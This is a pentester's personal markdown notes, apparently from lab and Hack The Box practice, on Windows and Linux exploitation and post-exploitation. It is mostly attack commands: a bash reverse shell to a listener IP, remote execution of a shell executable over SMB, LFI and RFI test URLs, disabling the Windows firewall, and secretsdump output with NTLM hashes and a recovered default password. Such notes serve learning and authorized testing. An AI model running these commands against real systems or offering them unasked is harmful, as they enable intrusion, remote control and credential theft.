# Pentest-Notes
Some notes for myself

## Windows exploitation

When using Microsoft FTP, use `dir -a` to see hidden files/folders.

Testing for Windows RCE with `ping <Kali-IP>` and listen with `tcpdump -i tap0 icmp`

Try a reverse shell RCE with this
CMD:
`start \\10.10.14.36\netmon\shell_443.exe`
Powershell:
`powershell.exe cmd /c “ping <kali-ip>”`

if you don't know what kind of RCE is allowed.

### SMB enum

enum4linux hasn't worked too well.

May have to edit `/etc/samba/smb.conf` to add
```
   client min protocol = CORE
   client max protocol = SMB3
```

Try this with `smbclient`:

```
smbclient -L 10.130.40.70

smbclient -U''%'' -L 10.130.40.70

smbclient --no-pass -L //172.30.111.10
```

Use `smbmap` to map the folders and permissions first, then see what you have access to access with smbclient.

```
smbmap -u test -p 12345 -H 10.130.40.70
smbclient -U 'test%12345' //10.130.40.70/Documents
```
or mount it first then browse
### Web

Check we can do LFI (include null byte terminator if necessary)

`http://members.foocompany.com/index.php?pag=//..//..//..//..//..//..//..//Windows//system32//drivers//etc//hosts%00`

See more here
https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

Check for RFI
`http://members.foocompany.com/index.php?pag=http://172.16.5.20:8000/`

Host dir with `python3 -m http.server`

## Windows post-exp

winPEAS requires .NET4, check what .NET is installed first.

Drop `nmap.exe` on windows target to enum, scan ports. Specify `-sT` option.

Get RDP if possible easier to enum with that with `xfreerdp /v:10.10.10.95:3389 /u:admin /p:Password1 /size:90%`

Use robocopy for transferring files from SMBserver

arp-scan.exe for discovering hosts on same subnet

Fping.exe for scanning outside networks. Here Fping from .1 to .254
```
C:\Temp>Fping.exe -g 172.30.111.1/172.30.111.254
Fping.exe -g 172.30.111.1/172.30.111.254

Fast pinger version 3.00
(c) Wouter Dhondt (http://www.kwakkelflap.com)

```
Disable FW if possible with `C:\Temp>netsh advfirewall set allprofiles state off`. Check status of FW with `C:\Temp>netsh advfirewall show allprofiles state`

If you can't `net use` a shared folder, enable File and Printer via RDP, reboot if necessary.

If you encounter error `A specified logon session does not exist.`, do [this](https://superuser.com/questions/968879/windows-10-map-network-drive-a-specified-logon-session-does-not-exist/1126123#1126123)

Robocopy syntax

```
C:\Temp\SSFWin32>robocopy \\172.16.10.5\lab9 C:\Temp\SSFWin32 /e
```
If need to pivot from Windows, and have problems with existing accounts, create account and net use with creds
```
net use \\10.100.11.101\pivot /user:admin Password1
```

Use `rmdir` to delete recursively on Windows

```
C:\Tmp>rmdir SSFWin32\SSF-Win32 /s /q
rmdir SSFWin32\SSF-Win32 /s /q
```

If you somehow have access to **SAM**, **SYSTEM** and **SECURITY** in `C:\Windows\System32\config`, use Impacket's secretsdump.py
```
root@Kali:~/HTB/Bastion# secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:e4487d0421e6611a364a5028467e053c:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... ```

Check for [PS history file ](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html) at
`C:\Users\sansforensics408\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>`
## Linux exploitation

If you can do RCE try
`nohup bash 'bash -i >& /dev/tcp/172.16.5.20/53 0>&1' &`

## Linux post-exp

To see cron jobs pertaining to your user
`crontab -l` 

Copying files from Linux and want to see progress? Use `rysnc`

```
root@Kali:~/PTP/Labs/Lab20# rsync -ah --progress /root/Tools/SSF-Win32 /mnt/pivot/SSFWin32
sending incremental file list
created directory /mnt/pivot/SSFWin32
```
